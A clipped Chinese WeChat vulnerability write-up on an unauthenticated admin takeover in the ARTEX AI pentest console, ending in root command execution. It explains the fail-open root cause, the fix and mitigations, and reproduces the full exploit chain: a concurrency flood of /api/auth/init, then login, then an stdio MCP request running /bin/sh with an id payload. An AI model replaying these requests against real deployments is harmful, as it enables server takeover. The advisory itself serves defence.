---
title: 【微信】【已复现】ARTEX存在未认证接管导致RCE漏洞
source: https://mp.weixin.qq.com/s/utfrj4RH_BjHvbM20H-8NA
source_host: mp.weixin.qq.com
clip_date: 2026-10-21T09:58:56+08:00
trace_id: 0bf60770-4268-43d6-8afb-88d9bf77ea2f
content_hash: bde8e62a467983176f4a0e93b10e3be974811b5fd5eee00909a781be94e3598f
status: synced
tags:
  - 微信
  - 漏洞分析
  - AI应用
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: ARTEX ≤v0.3.14 的 `/api/auth/init` 丢弃查询 error，导致 fail-open（出错时放行）：未认证者高并发打满 PostgreSQL 连接池即可改写管理员密码，再经 stdio MCP 执行命令；v0.3.15 已修复。
ai_summary_style: key-points
images_status:
  total: 3
  succeeded: 3
  failed_urls: []
notion_page_id: 40075244-d011-8112-b03f-c1dfa33c9d71
ioc:
  cves: []
  cwes:
    - CWE-636
    - CWE-754
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> ARTEX ≤v0.3.14 的 `/api/auth/init` 丢弃查询 error，导致 fail-open（出错时放行）：未认证者高并发打满 PostgreSQL 连接池即可改写管理员密码，再经 stdio MCP 执行命令；v0.3.15 已修复。
> 
> - **缺陷根因：** `authInit` 忽略 `GetSetting` 返回的 error；该函数在“键不存在”和“读取失败”两种情况下都返回空 value，只能靠 error 区分。error 被丢弃后，读取失败被当成“从未设置密码”，随后 upsert 覆盖已有密码哈希。
> - **触发条件：** `requireAuth` 将整个 `/api/auth/*` 列为白名单，未认证者可无限并发；旧版未设 `SetMaxOpenConns`，`database/sql` 默认不限连接数，并发请求顶满 PostgreSQL 的 `max_connections` 后新连接被拒，fail-open 生效。实测 800 并发 × 2 轮：200 响应 44 次、403 共 245 次、500 共 3 次、连接异常 508 次。
> - **RCE 链路：** 用覆盖后的密码登录取得管理员 JWT → `POST /api/mcp` 提交 `transport=stdio`、`command=/bin/sh`；创建时 `exec.Command` 立即启动子进程并完成 MCP 握手，命令输出被写入 tool description，再通过 `GET /api/mcp/{id}/tools` 回读，实测返回 `uid=0(root)`，即子进程以 root 运行。
> - **影响范围：** 受影响 v0.1.0–v0.3.14，修复 v0.3.15；对应 CWE-636 Fail Open、CWE-754。除接管管理员与命令执行外，因该产品自带资产扫描与漏洞利用能力，失陷后可作为攻击跳板。
> - **修复建议：** 提交 `8d8c102`（PR #197）改为读错误返回 503 fail-closed、写入改 `INSERT ... ON CONFLICT DO NOTHING`、设置 `SetMaxOpenConns(32)` 等连接池上限；另建议管理端口只监听 `127.0.0.1`、对 `/api/auth/init` 限速、JWT 绑定密码版本、`stdio` 命令白名单及子进程降权。

**黑白之道** *2026年10月21日 09:07*

## 一、产品介绍

ARTEX 是一款面向企业攻击面的 AI 自主渗透测试控制台，由 Go 后端与 Next.js 前端组成。 它支持任务编排、资产扫描、漏洞发现与利用、MCP 工具扩展，并可以通过 OpenAI / Anthropic 兼容接口接入上游大模型。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f882fb99c31ee22e.png)

典型部署方式：

-   Go 单二进制，默认管理端口 `8787` （README 示例），MCP 代理端口 `8788` ；
    
-   依赖 PostgreSQL 存储任务、资产、MCP 配置与模型 Profile；
    
-   支持 Docker Compose 部署，也支持直接运行二进制；
    
-   管理端默认暴露在 `0.0.0.0:8787` ，若直接映射到公网且未做额外访问控制，风险较高。
    

ARTEX 的 MCP 管理接口支持 `stdio` 、 `http` 、 `sse` 三种传输。其中 `stdio` 会由 ARTEX 主进程直接启动本地子进程，这是本文 RCE 链路的关键。

* * *

## 二、漏洞原理

### 2.1 缺陷代码

`POST /api/auth/init` 用于"首次设置管理员密码"。它在判断是否已初始化时， **显式丢弃了数据库查询返回的 error**：

```go
// server/auth.go  (v0.3.14)
func(s *Server) authInit(w http.ResponseWriter, r *http.Request) {
 pg := s.pg(w)
 existing, _, _ := pg.GetSetting(authPassKey)   // ← error 被丢弃
if existing != "" {
  writeErr(w, 403, "密码已设置")
return
 }
// ... bcrypt ...
if err := pg.SetSetting(authPassKey, string(hash)); err != nil { ... } // ← upsert 覆盖
 tok, _ := signJWT(s.jwtKey)
 writeJSON(w, 200, map[string]any{"token": tok})
}
```

### 2.2 "键不存在"与"读取失败"不可区分

`GetSetting` 在两种情况下都返回空 value，唯一的区分标志是 error：

```go
func(d *DB) GetSetting(key string) (value string, ok bool, err error) {
 err = d.QueryRow(`SELECT value FROM settings WHERE key=$1`, key).Scan(&value)
if err == sql.ErrNoRows {
return"", false, nil       // 键不存在
 }
if err != nil {
return"", false, err       // 读取失败，value 同样是 ""
 }
return value, true, nil
}
```

`authInit` 忽略 error 后，"读取失败"被当成"从未设置密码"，于是继续执行写操作。

### 2.3 未认证可达

`requireAuth` 把整个 `/api/auth/*` 前缀列为白名单：

```
if strings.HasPrefix(p, "/api/auth/") || p == "/api/health" {
 h.ServeHTTP(w, r)
return
}
```

因此任何未认证访问者都可以无限并发地调用 `/api/auth/init` 。

### 2.4 触发条件：PostgreSQL 连接耗尽

旧版没有设置 `SetMaxOpenConns` ， `database/sql` 默认不限制应用侧连接数。 每个 `/api/auth/init` 请求都会执行一次 `SELECT value FROM settings ...`； 并发足够高时会把 PostgreSQL 的 `max_connections` 顶满，新连接被拒绝， `GetSetting` 返回 error，fail-open 随即生效。

随后 `SetSetting` 使用 `INSERT ... ON CONFLICT DO UPDATE` （upsert）， 直接覆盖已存在的管理员密码哈希，并返回一个合法的管理员 JWT。

### 2.5 从认证绕接到 RCE

拿到管理员 JWT 后， `POST /api/mcp` 会接受 `stdio` 传输配置： 服务端把 `command` 与 `args` 交给 `exec.Command` 直接启动子进程。 这是 MCP 协议的固有设计——拥有 MCP 创建权限即拥有命令执行权限。 认证绕过把这一能力从"管理员"扩大到了"任何未认证访问者"。

* * *

## 三、影响范围

### 3.1 受影响版本

| 项目  | 内容  |
| --- | --- |
| 受影响版本 | v0.1.0 – v0.3.14 |
| 修复版本 | v0.3.15 及以后 |
| 修复提交 | `8d8c102`<br><br>（PR #197，分支 `fix/auth-init-fail-open` ） |
| 漏洞类型 | CWE-636 Fail Open / CWE-754 异常条件处理不当 |

### 3.2 影响后果

1.  **未认证管理员接管**：无需知道原密码，即可把管理员密码改成任意值；
    
2.  **服务器命令执行**：通过 `stdio` MCP 以 ARTEX 进程权限执行任意命令；
    
3.  **横向风险**：ARTEX 本身具备资产扫描与漏洞利用能力，失陷后可被用作攻击跳板。
    

* * *

## 四、复现过程

### 4.1 指纹确认

```
GET/api/healthHTTP/1.1
Host: TARGET_HOST
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8836d32527dada74.png)

确定是存在漏洞的版本

### 4.2 并发触发 Fail-Open

```
POST /api/auth/init
Body: {"password":"<REDACTED_PASSWORD>"}
并发: 800 轮次: 最多 2 轮
```

两轮统计：

```json
{
  "workers":800,
"rounds":2,
"codes":{"403":245,"200":44,"500":3,"TimeoutError":508}
}
```

-   `44` 个 `200` ：fail-open 生效，管理员密码被覆盖；
    
-   `245` 个 `403` ：数据库读取正常，正确返回"密码已设置"；
    
-   `3` 个 `500` ：写入阶段失败；
    
-   `508` 个连接异常：高并发下客户端侧连接被重置或超时。
    

### 4.3 登录取得管理员 JWT

```bash
POST/api/auth/loginHTTP/1.1
Host: TARGET_HOST
Content-Type: application/json
Content-Length: 58

{"username":"ARTEX","password":"<REDACTED_PASSWORD>"}
```

```
HTTP/1.1200
Content-Length: 160

{"token":"<REDACTED_JWT>"}
```

### 4.5 发送 id RCE 请求

Burp 数据包

```swift
POST/api/mcpHTTP/1.1
Host: TARGET_HOST
User-Agent: artex-burp-proof
Accept: application/json
Content-Type: application/json
Authorization: Bearer <JWT>
Content-Length: 510

{"name": "test_rce_id", "transport": "stdio", "command": "/bin/sh",
"args": ["-c", "OUT=$(id 2>&1 | base64 -w0); read a; printf '%s\\n' '{\"jsonrpc\":\"2.0\",\"id\":1,\"result\":{\"protocolVersion\":\"2024-11-05\",\"capabilities\":{\"tools\":{}},\"serverInfo\":{\"name\":\"burp-id\",\"version\":\"1.0\"}}}'; read b; read c; printf '{\"jsonrpc\":\"2.0\",\"id\":2,\"result\":{\"tools\":[{\"name\":\"burp_id\",\"description\":\"%s\",\"inputSchema\":{\"type\":\"object\"}}]}}\\n' \"$OUT\""],
"enabled": true}
```

```
HTTP/1.1200
Content-Type: application/json
Content-Length: 10

{"id":x} 
```

`{"id":x}` 表示 MCP 条目创建成功。ARTEX 在创建时同步执行工具发现， 即在本机启动 `/bin/sh -c "...id..."` 并完成 MCP 握手。

### 4.6 回读工具缓存，证明 id 已执行

### 获取命令执行结果

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/c6987fb4046772d6.png)

### 对 description 做 base64 解码：

### id 返回 uid=0(root)，说明 MCP 子进程以 root 身份运行在 ARTEX 主机上， RCE 成立。

### 4.8 整条利用链分析

```bash
① POST /api/auth/init（无认证、可无限并发）
        │
        │  800 并发打满 PostgreSQL max_connections
        ▼
② GetSetting 返回 error
        │
        │  authInit 丢弃 error，existing="" 被当成"未初始化"
        ▼
③ SetSetting upsert 覆盖管理员密码哈希，返回 JWT
        │
        ▼
④ POST /api/auth/login 用攻击者密码换取合法管理员会话
        │
        ▼
⑤ POST /api/mcp，transport=stdio，command=/bin/sh
        │
        │  ARTEX 以自身进程权限 exec 子进程
        ▼
⑥ 子进程执行 id → uid=0(root)
        │
        │  结果封装进 MCP tool description
        ▼
⑦ GET /api/mcp/{id}/tools 回读缓存，得到命令输出
```

* * *

## 五、修复建议

### 5.1 升级到 v0.3.15+

官方 `8d8c102` （PR #197）已完成三处修复：

1.  `authInit` / `authStatus` 读取出错时返回 `503` ，改为 fail-closed；
    
2.  写入由 upsert 改为 `INSERT ... ON CONFLICT DO NOTHING` ，不再覆盖已有密码；
    
3.  连接池设置上限（ `SetMaxOpenConns(32)` / `SetMaxIdleConns(32)` ），并补充连接寿命与空闲淘汰。
    

### 5.2 访问控制

-   管理端口默认只监听 `127.0.0.1` ；
    
-   公网访问通过 VPN、SSH 隧道或带认证与访问控制的反向代理；
    
-   对 `/api/auth/init` 增加来源限速与并发上限。
    

### 5.3 认证与会话

-   JWT 绑定密码版本，改密后旧 token 立即失效；
    
-   登录、改密、初始化全部写入审计日志（不记录凭据正文）；
    
-   增加登录失败计数与持久化锁定。
    

### 5.4 MCP 安全

-   对 `stdio` 类型 MCP 的 `command` / `args` 做白名单或禁用；
    
-   定期审计 `mcp_servers` ，删除可疑条目；
    
-   MCP 子进程使用低权限用户运行，避免 root。
    

文章来源：大白哥AI与安全
